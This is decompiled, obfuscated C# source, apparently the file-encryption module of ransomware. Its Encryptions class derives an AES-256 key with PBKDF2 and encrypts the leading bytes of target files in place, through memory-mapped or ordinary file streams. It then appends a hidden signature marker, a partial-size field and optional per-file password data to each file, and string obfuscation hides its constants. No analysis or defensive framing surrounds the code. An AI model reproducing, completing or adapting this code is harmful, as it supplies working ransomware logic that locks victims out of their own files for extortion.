using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace Complex;

public static class Encryptions
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] AESEncryptBytes(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = GenerateKey(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes GenerateKey(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] ReadFromFile(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (Program.Mmf == getString_0(107397035))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (Program.debugmode)
			{
				try
				{
					File.AppendAllText(Program.DebugReport, getString_0(107389833) + string_0 + getString_0(107402122) + ex.Message + getString_0(107396408));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void WriteToFile(string filename, byte[] encrypted, byte[] cryptPass = null)
	{
		try
		{
			byte[] array = null;
			if (Program.Mmf == getString_0(107397035))
			{
				array = (Program.Unique ? Encoding.ASCII.GetBytes(Program.Base64Decode(Program.MySign) + Program.Base64Decode(getString_0(107402096)) + Convert.ToString(Program.PartialSize) + Program.Base64Decode(getString_0(107402096))) : Encoding.ASCII.GetBytes(Program.Base64Decode(Program.MySign) + Program.Base64Decode(getString_0(107402105)) + Convert.ToString(Program.PartialSize) + Program.Base64Decode(getString_0(107402105))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(filename, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(encrypted, 0, encrypted.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(filename, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!Program.Unique)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(cryptPass, 0, cryptPass.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (Program.Unique ? Encoding.ASCII.GetBytes(Program.Base64Decode(Program.MySign) + Program.Base64Decode(getString_0(107402096)) + Convert.ToString(Program.PartialSize) + Program.Base64Decode(getString_0(107402096))) : Encoding.ASCII.GetBytes(Program.Base64Decode(Program.MySign) + Program.Base64Decode(getString_0(107402105)) + Convert.ToString(Program.PartialSize) + Program.Base64Decode(getString_0(107402105))));
			FileStream fileStream2 = new FileStream(filename, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(encrypted, 0, encrypted.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(filename, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!Program.Unique)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(cryptPass, 0, cryptPass.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (Program.debugmode)
			{
				try
				{
					File.AppendAllText(Program.DebugReport, getString_0(107389833) + filename + getString_0(107402055) + ex.Message + getString_0(107396408));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (Program.Unique ? Encoding.ASCII.GetBytes(Program.Base64Decode(Program.MySign) + Program.Base64Decode(getString_0(107402096)) + Convert.ToString(Program.PartialSize) + Program.Base64Decode(getString_0(107402096))) : Encoding.ASCII.GetBytes(Program.Base64Decode(Program.MySign) + Program.Base64Decode(getString_0(107402105)) + Convert.ToString(Program.PartialSize) + Program.Base64Decode(getString_0(107402105))));
			FileStream fileStream4 = new FileStream(filename, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(encrypted, 0, encrypted.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(filename, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!Program.Unique)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(cryptPass, 0, cryptPass.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static Encryptions()
	{
		Strings.CreateGetStringDelegate(typeof(Encryptions));
	}
}
